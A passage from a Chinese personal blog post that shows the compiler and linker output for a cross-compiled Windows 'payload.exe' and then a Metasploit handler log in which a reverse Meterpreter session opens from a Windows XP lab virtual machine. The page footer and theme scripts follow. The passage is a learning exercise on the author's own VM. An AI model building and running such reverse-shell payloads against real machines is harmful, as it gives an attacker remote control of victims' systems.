COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
 /usr/lib/gcc/i686-w64-mingw32/10.2.0/collect2 -plugin /usr/lib/gcc/i686-w64-mingw32/10.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cch6fKzn.res -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -plugin-opt=-pass-through=-lpthread -plugin-opt=-pass-through=-ladvapi32 -plugin-opt=-pass-through=-lshell32 -plugin-opt=-pass-through=-luser32 -plugin-opt=-pass-through=-lkernel32 -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -m i386pe -Bdynamic -o payload.exe /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/crt2.o /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtbegin.o -L/usr/lib/gcc/i686-w64-mingw32/10.2.0 -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib /tmp/ccvhBE4k.o -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt -lpthread -ladvapi32 -lshell32 -luser32 -lkernel32 -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtend.o
COLLECT_GCC_OPTIONS=&#39;-o&#39; &#39;payload.exe&#39; &#39;-v&#39; &#39;-mtune=generic&#39; &#39;-march=pentiumpro&#39;
</code></pre></div><p>没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的</p>
<h2 id="检验">检验</h2>
<p><img src="/img/2021-05-07-18-18-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[*] Started reverse TCP handler on 192.168.0.112:3333 
[*] Sending stage (175174 bytes) to 192.168.0.113
[*] Meterpreter session 1 opened (192.168.0.112:3333 -&gt; 192.168.0.113:1045) at 2021-05-07 18:18:17 +0800

meterpreter &gt; sysinfo
Computer        : CHINA-74ED62096
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter &gt; 
</code></pre></div><p>我们直接丢进去跑&hellip;</p>
<p>emmm 虽然字乱码了。</p>
<p>不过连接是建立了，那么说明编译是有效的～</p>

                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">最后修改于 2021-04-26</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts">
			下回<br>已经到头啦。
                </a>
                
                
                
                <a class="older-posts" href="https://weepingdogel.github.io/posts/%E5%AD%A6gtk%E8%AE%B0/">
			上回<br>学 GTK 记
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                


<div id="gitalk-container"></div>






            </div>
        </div>
    </div>
</div>

            </div><div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
<br>
移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	2019-2021 | WeepingDogel via CC-BY-NC 4.0
	
</div>
            </div>
    <script>
let app;

app = new Vue({
    el: '#app',
    data: {
        scrollY: 0,
        navOpacity: 0,
        isDrawerOpen: false,
        mounted: false,
        isDarkMode: false
    },
    methods: {
            sgn(t, x) {
                let k = 1. / (1. - 2 * t);
                if (x <= t) return 0;
                else if (x >= 1 - t) return 1;
                else {
                    return k * (x - t);
                }
            },
            handleScroll() {
                this.scrollY = window.scrollY;
                this.navOpacity = this.sgn(.0, Math.min(1, Math.max(0, window.scrollY / (this.pageHeadHeight() - this.navBarHeight() * 0.8))));
                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;

                if (this.navOpacity >= 1) {
                    navBackground.style.opacity = 1;
                    navTitle.style.opacity = 1;
                } else {
                    navBackground.style.opacity = 0;
                    navTitle.style.opacity = 0;
                }
            },
            handleResize() {
                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
                extraContainer.style.left = (streamContainer.offsetWidth - extraContainer.offsetWidth) + 'px';
            },
            navBarHeight() {
                return this.$refs.navBar.offsetHeight;
            },
            pageHeadHeight() {
                return this.$refs.pageHead.offsetHeight;
            },
            toggleDrawer() {
                this.isDrawerOpen = !this.isDrawerOpen;
                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
            },
            closeDrawer() {
                this.isDrawerOpen = false;
                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
            },
            toggleDarkMode() {
                this.isDarkMode = !this.isDarkMode;
                if (this.isDarkMode==true){
                    document.cookie = "night=1;path=/";
                    document.body.classList.add("night");
                } else {
                    document.cookie = "night=0;path=/";
                    document.body.classList.remove("night");
                }
            }
    },
    created() {
        window.addEventListener('scroll', this.handleScroll);
        window.addEventListener('resize', this.handleResize);
        window._nonDesktop = function () {
            let check = false;
            (function (a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        };
        
        var night = document.cookie.replace(/(?:(?:^|.*;\s*)night\s*\=\s*([^;]*).*$)|^.*$/, "$1");
        if (night==""){
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                
            }
        }else{
            
            if (night=="1") {
                this.toggleDarkMode();
            }
        }
    },
    mounted() {
        this.handleScroll();
        this.handleResize();
        this.mounted = true;

        
    },
    destroyed() {
        window.removeEventListener('scroll', this.handleScroll);
        window.removeEventListener('resize', this.handleResize);
    }
});
</script>

<script src="https://weepingdogel.github.io//js/journal.js"></script>
    </body>
</html>
